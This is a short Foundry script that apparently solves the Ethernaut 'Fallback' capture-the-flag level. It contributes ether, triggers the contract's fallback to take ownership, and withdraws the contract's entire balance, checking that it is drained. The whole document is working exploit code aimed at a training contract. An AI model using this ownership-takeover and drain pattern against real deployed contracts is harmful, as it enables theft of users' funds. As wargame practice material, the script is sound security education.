pragma solidity ^0.8.17;
import "forge-std/Script.sol";
import "../src/Fallback/Fallback.sol";

contract FallbackScript is Script {
    function run() public {
        address fallbackAddress = vm.envAddress("FALLBACK_ADDRESS");
        Fallback ethernautFallback = Fallback(payable(fallbackAddress));

        uint256 deployerKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerKey);

        ethernautFallback.contribute{value: 0.0005 ether}();

        uint contribution = ethernautFallback.getContribution();
        require(contribution != 0, "contribution failed");

        (bool success, ) = payable(ethernautFallback).call{value: 1 wei}("");
        require(success, "fallback failed");

        ethernautFallback.withdraw();
        require(address(ethernautFallback).balance == 0, "contract not drained");

        vm.stopBroadcast();
        console.log("SUCCESS");
    }
}